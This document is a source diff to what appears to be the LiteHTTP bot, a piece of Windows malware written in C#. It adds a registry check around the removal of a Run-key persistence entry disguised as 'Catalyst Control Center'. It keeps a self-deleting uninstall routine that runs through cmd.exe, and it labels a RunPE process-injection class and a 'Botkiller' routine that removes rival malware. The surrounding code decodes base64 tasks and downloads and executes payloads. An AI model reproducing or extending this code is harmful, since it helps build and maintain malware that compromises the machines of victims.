@@ -91,6 +91,18 @@ namespace LiteHTTP.Classes
             return s.ToString();
         }
 
+        public static bool keyExists(string key)
+        {
+            bool exists = false;
+            Microsoft.Win32.RegistryKey reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", false);
+            foreach (string r in reg.GetValueNames())
+            {
+                if (r == key)
+                    exists = true;
+            }
+            return exists;
+        }
+
         public static bool processTask(string task, string param)
         {
             string dt = Encoding.UTF8.GetString(Convert.FromBase64String(task));
@@ -201,8 +213,11 @@ namespace LiteHTTP.Classes
             {
                 dlex(url);
                 Program.s.Abort();
-                Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                regkey.DeleteValue("Catalyst Control Center");
+                if (keyExists("Catalyst Control Center"))
+                {
+                    Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    regkey.DeleteValue("Catalyst Control Center");
+                }
                 System.Diagnostics.ProcessStartInfo si = new System.Diagnostics.ProcessStartInfo();
                 si.FileName = "cmd.exe";
                 si.Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del \"" + getLocation() + "\"";
@@ -276,8 +291,11 @@ namespace LiteHTTP.Classes
             try
             {
                 Program.s.Abort();
-                Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                regkey.DeleteValue("Catalyst Control Center");
+                if (keyExists("Catalyst Control Center"))
+                {
+                    Microsoft.Win32.RegistryKey regkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    regkey.DeleteValue("Catalyst Control Center");
+                }
                 System.Diagnostics.ProcessStartInfo si = new System.Diagnostics.ProcessStartInfo();
                 si.FileName = "cmd.exe";
                 si.Arguments = "/C ping 1.1.1.1 -n 1 -w 4000 > Nul & Del \"" + getLocation() + "\"";
@@ -291,7 +309,8 @@ namespace LiteHTTP.Classes
                 return false;
             }
         }
-
+        
+        // BEGIN - RunPE (injection)
         public class RunPE
         {
             [DllImport("ntdll")]
@@ -363,14 +382,15 @@ namespace LiteHTTP.Classes
                 }
             }
         }
+        // END
 
         /* Credit goes to an unknown creator for the "Removal" class
          * Modified by Zettabit for better efficiency
+         * 
+         * BEGIN - Botkiller
          */
         public class Removal
         {
-            [DllImport("kernel32.dll")]
-            private static extern long MoveFileExA(string oldname, string newname, long nword);
             public static string applocal = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
             public static string temp = Environment.GetEnvironmentVariable("temp");
             public static string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
@@ -402,7 +422,6 @@ namespace LiteHTTP.Classes
             }
             public static void ScanThread()
             {
-                Console.WriteLine("Starting a scan...");
                 Thread exscan = new Thread(new ThreadStart(scan));
                 exscan.SetApartmentState(ApartmentState.STA);
                 exscan.Start();
@@ -612,5 +631,6 @@ namespace LiteHTTP.Classes
                 return ret;
             }
         }
+        // END
     }
 }
